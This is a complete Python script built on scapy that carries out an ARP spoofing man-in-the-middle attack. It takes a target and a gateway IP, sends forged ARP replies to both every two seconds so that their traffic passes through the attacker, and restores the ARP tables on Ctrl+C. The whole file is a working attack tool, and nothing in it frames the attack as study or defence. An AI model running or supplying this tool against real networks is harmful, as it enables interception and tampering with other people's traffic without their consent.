import argparse
import time
import sys
from typing import Tuple
from scapy.all import ARP, Ether, srp, sendp


def get_arguments() -> Tuple[str, str]:
    """Parses command-line arguments and returns target and gateway IP addresses."""
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Specify target IP")
    parser.add_argument("-g", "--gateway", dest="gateway",
                        help="Specify gateway IP")
    args = parser.parse_args()
    if not all([args.target, args.gateway]):
        parser.error("Please specify both target and gateway IP addresses.")
    return args.target, args.gateway


def get_mac(ip: str) -> str:
    """Returns MAC address of the given IP address using ARP."""
    arp_packet = ARP(pdst=ip)
    broadcast_packet = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet/arp_packet
    # Use srp() instead of sr() to get a list of answered packets
    answered_list = srp(arp_broadcast_packet, timeout=1,
                        verbose=False, iface=None)[0]
    return answered_list[0][1].hwsrc


def restore(destination_ip: str, source_ip: str) -> None:
    """Restores original ARP tables of the target and the gateway."""
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    # Set op to 2 to indicate an ARP reply
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                 psrc=source_ip, hwsrc=source_mac)
    # Send four packets to ensure that the ARP table is restored
    sendp(packet, verbose=False, count=4)


def spoof(target_ip: str, spoof_ip: str) -> None:
    """Sends spoofed ARP packets to the target and the gateway."""
    target_mac = get_mac(target_ip)
    # Set op to 2 to indicate an ARP reply
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)


if __name__ == '__main__':
    target_ip, gateway_ip = get_arguments()
    sent_packets = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets += 2
            print(f"\r[+] Sent packets: {sent_packets}", end="")
            sys.stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[-] Ctrl + C detected. Restoring ARP Tables Please Wait!")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
